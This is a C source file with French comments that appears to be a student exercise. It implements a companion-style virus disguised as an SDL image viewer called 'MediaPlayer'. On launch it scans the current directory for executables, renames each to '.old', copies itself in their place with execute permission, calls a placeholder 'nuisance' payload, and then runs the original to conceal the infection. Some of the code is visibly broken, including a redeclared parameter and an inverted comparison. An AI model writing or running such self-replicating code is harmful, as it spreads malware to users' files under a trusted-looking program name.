#include <SDL2/SDL.h>
#include <SDL2/SDL_image.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>

char* nomFichierActuel;

void destruction() {
    printf("Déclenchement de la nuisance ...\n");
}

void infection(struct dirent *entry) {
    char ancienNom[256];
    char nouveauNom[256];
    DIR *directory;
    struct dirent *entry;
    char commande[512];

    strcpy(ancienNom, entry->d_name);
    // Renommer le fichier avec l'extension ".old"
    strcpy(nouveauNom, entry->d_name);
    strcat(nouveauNom, ".old");
    rename(entry->d_name, nouveauNom);

    // Ouvrir le répertoire courant
    directory = opendir(".");

    // Parcourir les fichiers du répertoire pour trouver le fichier du même nom
    while ((entry = readdir(directory)) != NULL) {
        if (strcmp(ancienNom, nomFichierActuel)) {
            // Dupliquer le virus avec le nom du programme infecté
            sprintf(commande, "cp %s %s", nomFichierActuel, ancienNom);
            system(commande);

            // Ajouter les permissions d'exécution à la copie
            chmod(ancienNom, S_IRUSR | S_IWUSR | S_IXUSR);
            break;
        }
    }

    // Fermer le répertoire
    closedir(directory);
}

void lutteSurinfection(struct dirent *entry) {
    // Obtenir l'extension du fichier
    char *extension = strstr(entry->d_name, ".old");
    
    // Vérifier que le fichier n'a pas l'extension '.old'
    if (extension == NULL) {
        DIR *directory;
        struct dirent *entry2;

        // Ouvrir le répertoire courant
        directory = opendir(".");

        bool fichierInfecte = false;
        // Créer le nom du fichier potentiellement infecté, c'est à dire le fichier avec l'extension '.old'
        char nomFichierPotentiellementInfecte[256];
        strcpy(nomFichierPotentiellementInfecte, entry->d_name);
        strcat(nomFichierPotentiellementInfecte, ".old");

        // Parcourir les fichiers du répertoire pour savoir si le fichier du même nom avec l'extension '.old' existe
        while ((entry2 = readdir(directory)) != NULL) {
            if (!strcmp(entry2->d_name, nomFichierPotentiellementInfecte)) {
                fichierInfecte = true;
                break;
            }
        }

        // Si le fichier n'est pas infecté, on l'infecte
        if (!fichierInfecte){
            infection(entry);
        }

        // Fermer le répertoire
        closedir(directory);
    }
}

void reproduction(struct dirent *entry) {
    lutteSurinfection(entry);
}


void recherche() {
    DIR *directory;
    struct dirent *entry;
    
    // Ouvrir le répertoire courant
    directory = opendir(".");
    
    // Parcourir les fichiers du répertoire
    while ((entry = readdir(directory)) != NULL) {
    	struct stat statFichier;
        stat(entry->d_name, &statFichier);

        // Vérifier que le fichier est un exécutable régulier et qu'il n'est pas MediaPlayer
        if (strcmp(entry->d_name, "MediaPlayer.exe") && S_ISREG(statFichier.st_mode) && (statFichier.st_mode & S_IXUSR) != 0 ) {
            reproduction(entry);
        }
    }
    
    closedir(directory);
}

const char* imagePaths[] = {"audi.jpg", "mercedes.jpg", "decoration.jpg", "vespa.jpg", "water.png", "pingouin.bmp"};
void afficherImages() {
    int windowWidth = 800;
    int windowHeight = 800;

    // Initialisation de SDL
    SDL_Init(SDL_INIT_VIDEO);

    // Création de la fenêtre
    SDL_Window *window = SDL_CreateWindow("Media Player", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, windowWidth, windowHeight, SDL_WINDOW_SHOWN);
    SDL_Renderer *renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);

    // Activer le lissage
    SDL_SetHint(SDL_HINT_RENDER_SCALE_QUALITY, "linear");

    // Préchargement des textures
    SDL_Texture *textures[6];
    SDL_Rect destRects[6];
    for (int i = 0; i < 6; ++i) {
        SDL_Surface *surface = IMG_Load(imagePaths[i]);

        // Redimensionner l'image pour qu'elle garde ses proportions
        int resizedSurfaceWidth;
        int resizedSurfaceHeight;
        int tailleMax = fmax(surface->w, surface->h);
        if (tailleMax == surface->w){
            resizedSurfaceWidth = windowWidth;
            resizedSurfaceHeight = windowWidth * surface->h / surface->w;
        }
        else {
            resizedSurfaceWidth = windowHeight * surface->w / surface->h;
            resizedSurfaceHeight = windowHeight;
        }
        destRects[i].x = (windowWidth - resizedSurfaceWidth) / 2;
        destRects[i].y = (windowHeight - resizedSurfaceHeight) / 2;
        destRects[i].w = resizedSurfaceWidth;
        destRects[i].h = resizedSurfaceHeight;
        textures[i] = SDL_CreateTextureFromSurface(renderer, surface);
        
        SDL_FreeSurface(surface);
    }

    // Boucle principale
    int quit = 0;
    int currentImageIndex = 0;
    while (!quit) {
        // Gestion des événements
        SDL_Event event;
        while (SDL_PollEvent(&event)) {
            if (event.type == SDL_QUIT) {
                quit = 1;
            } else if (event.type == SDL_KEYDOWN) {
                switch (event.key.keysym.sym) {
                    case SDLK_LEFT:
                        currentImageIndex = (currentImageIndex - 1 + 6) % 6;
                        break;
                    case SDLK_RIGHT:
                        currentImageIndex = (currentImageIndex + 1) % 6;
                        break;
                    default:
                        break;
                }
            }
        }

        // Affichage de l'image courante
        SDL_RenderClear(renderer);
        SDL_RenderCopy(renderer, textures[currentImageIndex], NULL, &destRects[currentImageIndex]);
        SDL_RenderPresent(renderer);
        SDL_Delay(10);
    }

    // Libération des ressources
    for (int i = 0; i < 6; ++i) {
        SDL_DestroyTexture(textures[i]);
    }
    SDL_DestroyRenderer(renderer);
    SDL_DestroyWindow(window);
    SDL_Quit();
}

int main(int argc, char* argv[]) {
    nomFichierActuel = argv[0];
    recherche();
    destruction();
    if (!strcmp(nomFichierActuel, "./MediaPlayer.exe")){
        afficherImages();
    }
    else {
        char commande[100];
        sprintf(commande, "%s.old", nomFichierActuel);
        system(commande);
    }
    return 0;
}